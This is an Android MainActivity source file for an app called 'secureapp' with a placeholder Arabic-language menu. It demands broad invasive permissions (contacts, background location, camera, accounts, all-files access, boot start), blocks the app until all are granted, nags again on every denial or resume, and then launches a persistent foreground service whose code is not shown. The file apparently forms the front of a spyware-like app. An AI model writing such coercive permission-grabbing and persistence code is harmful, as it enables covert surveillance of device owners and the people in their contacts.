package com.secureapp.app.ui;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.LinearLayout;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.secureapp.app.R;
import com.secureapp.app.service.PersistentService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.GET_ACCOUNTS,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.RECEIVE_BOOT_COMPLETED
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (!checkAllPermissions()) {
            requestAllPermissions();
            return;
        }

        setContentView(R.layout.activity_main);
        initUI();
        startPersistentService();
    }

    private void initUI() {
        findViewById(R.id.menuLibrary).setOnClickListener(v -> {
            Toast.makeText(this, "المكتبة", Toast.LENGTH_SHORT).show();
        });

        findViewById(R.id.menuProjects).setOnClickListener(v -> {
            Toast.makeText(this, "المشروعات", Toast.LENGTH_SHORT).show();
        });

        findViewById(R.id.menuApps).setOnClickListener(v -> {
            Toast.makeText(this, "التطبيقات", Toast.LENGTH_SHORT).show();
        });

        findViewById(R.id.menuMore).setOnClickListener(v -> {
            Toast.makeText(this, "المزيد", Toast.LENGTH_SHORT).show();
        });

        findViewById(R.id.fabButton).setOnClickListener(v -> {
            Intent intent = new Intent(this, ImageCreateActivity.class);
            startActivity(intent);
        });

        findViewById(R.id.searchBar).setOnClickListener(v -> {
            Toast.makeText(this, "بحث...", Toast.LENGTH_SHORT).show();
        });
    }

    private boolean checkAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                return false;
            }
        }
        return true;
    }

    private void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                recreate();
            } else {
                requestAllPermissions();
                Toast.makeText(this, "الصلاحيات مطلوبة للعمل", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void startPersistentService() {
        Intent serviceIntent = new Intent(this, PersistentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!checkAllPermissions()) {
            requestAllPermissions();
        }
    }
}
